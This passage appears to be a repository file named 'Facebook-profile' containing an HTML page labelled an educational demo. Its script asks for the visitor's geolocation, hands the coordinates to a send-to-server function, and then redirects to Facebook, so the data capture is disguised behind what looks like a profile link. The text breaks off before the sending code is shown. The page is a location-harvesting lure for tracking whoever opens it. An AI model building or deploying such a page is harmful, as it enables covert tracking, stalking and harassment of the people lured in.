# Facebook-profile
<!DOCTYPE html>
<html>
<head>
    <title>Educational Demo</title>
    <script>
        // Function to request location (requires user permission)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        sendToServer(lat, lng); // Send data to server
                        window.location.href = "https://www.facebook.com"; // Redirect to Facebook
                    },
                    (error) => {
                        alert("Permission denied.");
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Send data
